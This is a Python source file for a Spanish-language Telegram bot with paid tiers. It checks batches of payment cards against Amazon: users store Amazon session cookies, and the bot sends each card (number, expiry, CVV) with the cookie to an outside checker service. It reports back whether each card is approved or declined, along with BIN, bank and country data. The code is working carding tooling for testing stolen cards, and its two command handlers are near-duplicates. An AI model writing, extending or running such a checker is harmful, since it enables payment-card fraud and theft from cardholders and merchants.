import time
import re
import requests
import json
import uuid
import string
from random import choice
from pyrogram import Client, filters
from db.mongo_client import MongoDB
import asyncio
import aiohttp
import base64
from srca.configs import addCommand

# 📌 Guardar la cookie de un usuario
def save_cookie(user_id, cookie):
    try:
        # Usar MongoDB para guardar la cookie
        db = MongoDB()
        db.db["cookies_regional"].update_one(
            {"user_id": user_id},
            {"$set": {"cookie": cookie}},
            upsert=True
        )
        return True, "Cookie guardada correctamente"
    except Exception as e:
        return False, f"Error al guardar la cookie: {str(e)}"

# 📌 Obtener la cookie de un usuario
def get_cookie(user_id):
    db = MongoDB()
    data = db.db["cookies_regional"].find_one({"user_id": user_id})
    return data["cookie"] if data else None

# 📌 Comando para guardar la cookie
@Client.on_message(filters.command("cookie", prefixes=['.', '/', '!', '$'], case_sensitive=False) & filters.text)
async def set_cookie_command(client, message):
    try:
        user_id = message.from_user.id
        args = message.text.split(maxsplit=1)
        
        if len(args) < 2:
            return await message.reply("⚠️ Debes proporcionar una cookie.\n\nEjemplo:\n`/cookie [tu_cookie]`")
        
        cookie = args[1]
        success, msg = save_cookie(user_id, cookie)
        
        if success:
            await message.reply("✅ Cookie guardada correctamente. Use /amazon para verificar tarjetas")
        else:
            await message.reply(f"❌ {msg}")
            
    except Exception as e:
        await message.reply(f"⚠️ Error al guardar la cookie: {str(e)}")

# 📌 Comando para verificar tarjetas
@addCommand('am')
async def check_cards(client, message):
    try:
        inicio = time.time()
        user_id = message.from_user.id

        # Verificar usuario y obtener cookie
        db = MongoDB()
        user_data = db.query_user(user_id)
        
        if not user_data:
            return await message.reply("<b>Primero debes registrarte para usar este comando, usa /register</b>")
        
        if user_data['role'] == 'baneado':
            return await message.reply("<b>No tienes permiso para usar el bot.❌\nRazón: Baneado.</b>")
        
        if not db.admin(user_id) and user_data.get('plan', 'free') == 'free':
            return await message.reply('<b>🚫 Usuario Free</b>\n\n¡Aprovecha todo el potencial del bot!\nActualiza a premium y accede a herramientas exclusivas.\n👉 <a href="https://t.me/+A6wPSRDlqu8yZDMx">Solicitar upgrade</a>')

        # Obtener la cookie
        cookie_data = get_cookie(user_id)
        if not cookie_data:
            return await message.reply("⚠️ No tienes una cookie guardada. Usa /cookie [cookie] para agregar una.")

        # Extraer tarjetas más eficientemente
        ccs = []
        text_lines = message.text.split('\n')
        cc_pattern = r"^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$"
        
        # Procesar primera línea (comando)
        cmd_parts = text_lines[0].split()
        if len(cmd_parts) > 1 and re.match(cc_pattern, cmd_parts[1]):
            ccs.append(cmd_parts[1])
        
        # Procesar líneas adicionales (límite de 15 tarjetas)
        for line in text_lines[1:15]:
            if re.match(cc_pattern, line.strip()):
                ccs.append(line.strip())

        if not ccs:
            return await message.reply(f"<b>Formato inválido. Usa /am cc|mm|aaaa|cvv</b>")
        
        if len(ccs) > 15:
            return await message.reply("<b>❌ Máximo 15 tarjetas por consulta</b>")

        # Mensaje inicial
        loading_message = await message.reply(f'''<b>・ Amazon Global

• Cc: <code>{ccs[0]}</code>      
• Status: Processing... [ ☃️ ]
• From: {message.from_user.first_name}</b>''')
        
        # Procesar tarjetas
        resultados = []
        for idx, ccvip in enumerate(ccs, 1):
            try:
                cc, mes, ano, cvv = ccvip.split('|')

                # Obtener información del BIN
                req = await asyncio.to_thread(requests.get, f'https://binlist.io/lookup/{cc[:6]}')

                # Preparar la solicitud a la API
                headers = {}
                payload = {
                    'lista': ccvip.strip(),
                    'cookies': cookie_data.strip()
                }

                # Hacer la petición a la API
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        "https://ookurachk.blog/amazon/Amazon.php",
                        data=payload,
                        headers=headers,
                        timeout=180
                    ) as response:
                        response_text = await response.text()

                # Parsear la respuesta HTML
                status_match = re.search(r'<span class="text-(success|danger)">(Aprovada|Reprovada|Erros)</span>', response_text)
                message_match = re.search(r'<span class="text-(success|danger)">(.+?)</span>\s*➔\s*Tempo de resposta', response_text, re.DOTALL)
                removed_match = re.search(r'Removido: (✅|❌)', response_text)

                status = "⚠️ Error"
                response_msg = "Error al procesar la respuesta de la API"
                removed_status = "❌ No removido"

                # Procesar la respuesta
                if message_match:
                    response_msg_raw = message_match.group(2).strip()
                    if "Erro ao obter acesso passkey" in response_msg_raw:
                        status = "❌ Invalid Cookies"
                        response_msg = "Close and login to your account again"
                    elif "Cookies não detectado" in response_msg_raw:
                        status = "❌ Invalid Cookies"
                        response_msg = "Invalid cookie, please change"
                    elif "Um endereço foi cadatrado" in response_msg_raw:
                        status = "⚠️ Address Required"
                        response_msg = "Add address to account"
                    elif "Erro interno - Amazon API" in response_msg_raw:
                        status = "⚠️ Error"
                        response_msg = "Internal API Error"
                    elif "Lista inválida" in response_msg_raw:
                        status = "⚠️ Error"
                        response_msg = "Invalid card format"
                    else:
                        if status_match:
                            status_raw = status_match.group(2)
                            if status_raw == "Aprovada":
                                status = "Approved Card!"
                                response_msg = "Approved Card! ✅"
                            elif status_raw == "Reprovada":
                                status = "Declined Card!"
                                response_msg = "Declined Card! ❌"

                if removed_match:
                    removed_status = removed_match.group(1) + " Removido" if removed_match.group(1) == "✅" else "❌ No removido"

                # Agregar resultado a la lista
                resultados.append(f'''<b>・ Amazon Global

• Cc: <code>{ccvip}</code>
• Status: {status}
• Response: <code>{response_msg}</code>

• Bin: {req.json()['scheme']} {req.json()['type']} {req.json()['category']}
• Country: {req.json()['country']['name']} [{req.json()['country']['emoji']}]
• Bank: {req.json()['bank']['name']}

• Pxs: Live ✅
• Time: <code>{time.time()-inicio:0.4f}'s</code>
• From: {message.from_user.first_name}</b>''')

                # Actualizar mensaje con todos los resultados
                texto_final = "\n\n".join(resultados)
                try:
                    await loading_message.edit_text(texto_final)
                    await asyncio.sleep(2)  # Esperar 2 segundos entre actualizaciones
                except Exception as e:
                    print(f"Error al actualizar mensaje: {str(e)}")
                    continue

            except Exception as e:
                try:
                    await loading_message.edit_text(f"<b>Error: {str(e)}</b>")
                    await asyncio.sleep(2)
                except:
                    pass
                continue

    except Exception as e:
        await message.reply(f"<b>⚠️ Error general: {str(e)}</b>")

# 📌 Comando para verificar tarjetas
@Client.on_message(filters.command("amazon", prefixes="."))
async def amazon_command(client, message):
    try:
        inicio = time.time()
        user_id = message.from_user.id

        # Verificar usuario y obtener cookie
        db = MongoDB()
        user_data = db.query_user(user_id)
        
        if not user_data:
            return await message.reply("<b>Primero debes registrarte para usar este comando, usa /register</b>")
        
        if user_data['role'] == 'baneado':
            return await message.reply("<b>No tienes permiso para usar el bot.❌\nRazón: Baneado.</b>")
        
        if not db.admin(user_id) and user_data.get('plan', 'free') == 'free':
            return await message.reply('<b>🚫 Usuario Free</b>\n\n¡Aprovecha todo el potencial del bot!\nActualiza a premium y accede a herramientas exclusivas.\n👉 <a href="https://t.me/+A6wPSRDlqu8yZDMx">Solicitar upgrade</a>')

        # Obtener la cookie
        cookie_data = get_cookie(user_id)
        if not cookie_data:
            return await message.reply("⚠️ No tienes una cookie guardada. Usa /cookie [cookie] para agregar una.")

        # Extraer tarjetas más eficientemente
        ccs = []
        text_lines = message.text.split('\n')
        cc_pattern = r"^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$"
        
        # Procesar primera línea (comando)
        cmd_parts = text_lines[0].split()
        if len(cmd_parts) > 1 and re.match(cc_pattern, cmd_parts[1]):
            ccs.append(cmd_parts[1])
        
        # Procesar líneas adicionales (límite de 15 tarjetas)
        for line in text_lines[1:15]:
            if re.match(cc_pattern, line.strip()):
                ccs.append(line.strip())

        if not ccs:
            return await message.reply(f"<b>Formato inválido. Usa /am cc|mm|aaaa|cvv</b>")
        
        if len(ccs) > 15:
            return await message.reply("<b>❌ Máximo 15 tarjetas por consulta</b>")

        # Mensaje inicial
        loading_message = await message.reply(f'''<b>・ Amazon Global

• Cc: <code>{ccs[0]}</code>      
• Status: Processing... [ ☃️ ]
• From: {message.from_user.first_name}</b>''')
        
        # Procesar tarjetas
        resultados = []
        for idx, ccvip in enumerate(ccs, 1):
            try:
                cc, mes, ano, cvv = ccvip.split('|')

                # Obtener información del BIN
                req = await asyncio.to_thread(requests.get, f'https://binlist.io/lookup/{cc[:6]}')

                # Preparar la solicitud a la API
                headers = {}
                payload = {
                    'lista': ccvip.strip(),
                    'cookies': cookie_data.strip()
                }

                # Hacer la petición a la API
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        "#APIAMAZON",
                        data=payload,
                        headers=headers,
                        timeout=180
                    ) as response:
                        response_text = await response.text()

                # Parsear la respuesta HTML
                status_match = re.search(r'<span class="text-(success|danger)">(Aprovada|Reprovada|Erros)</span>', response_text)
                message_match = re.search(r'<span class="text-(success|danger)">(.+?)</span>\s*➔\s*Tempo de resposta', response_text, re.DOTALL)
                removed_match = re.search(r'Removido: (✅|❌)', response_text)

                status = "⚠️ Error"
                response_msg = "Error al procesar la respuesta de la API"
                removed_status = "❌ No removido"

                # Procesar la respuesta
                if message_match:
                    response_msg_raw = message_match.group(2).strip()
                    if "Erro ao obter acesso passkey" in response_msg_raw:
                        status = "❌ Invalid Cookies"
                        response_msg = "Close and login to your account again"
                    elif "Cookies não detectado" in response_msg_raw:
                        status = "❌ Invalid Cookies"
                        response_msg = "Invalid cookie, please change"
                    elif "Um endereço foi cadatrado" in response_msg_raw:
                        status = "⚠️ Address Required"
                        response_msg = "Add address to account"
                    elif "Erro interno - Amazon API" in response_msg_raw:
                        status = "⚠️ Error"
                        response_msg = "Internal API Error"
                    elif "Lista inválida" in response_msg_raw:
                        status = "⚠️ Error"
                        response_msg = "Invalid card format"
                    else:
                        if status_match:
                            status_raw = status_match.group(2)
                            if status_raw == "Aprovada":
                                status = "Approved Card!"
                                response_msg = "Approved Card! ✅"
                            elif status_raw == "Reprovada":
                                status = "Declined Card!"
                                response_msg = "Declined Card! ❌"

                if removed_match:
                    removed_status = removed_match.group(1) + " Removido" if removed_match.group(1) == "✅" else "❌ No removido"

                # Agregar resultado a la lista
                resultados.append(f'''<b>・ Amazon Global

• Cc: <code>{ccvip}</code>
• Status: {status}
• Response: <code>{response_msg}</code>

• Bin: {req.json()['scheme']} {req.json()['type']} {req.json()['category']}
• Country: {req.json()['country']['name']} [{req.json()['country']['emoji']}]
• Bank: {req.json()['bank']['name']}

• Pxs: Live ✅
• Time: <code>{time.time()-inicio:0.4f}'s</code>
• From: {message.from_user.first_name}</b>''')

                # Actualizar mensaje con todos los resultados
                texto_final = "\n\n".join(resultados)
                try:
                    await loading_message.edit_text(texto_final)
                    await asyncio.sleep(2)  # Esperar 2 segundos entre actualizaciones
                except Exception as e:
                    print(f"Error al actualizar mensaje: {str(e)}")
                    continue

            except Exception as e:
                try:
                    await loading_message.edit_text(f"<b>Error: {str(e)}</b>")
                    await asyncio.sleep(2)
                except:
                    pass
                continue

    except Exception as e:
        await message.reply(f"<b>⚠️ Error general: {str(e)}</b>")
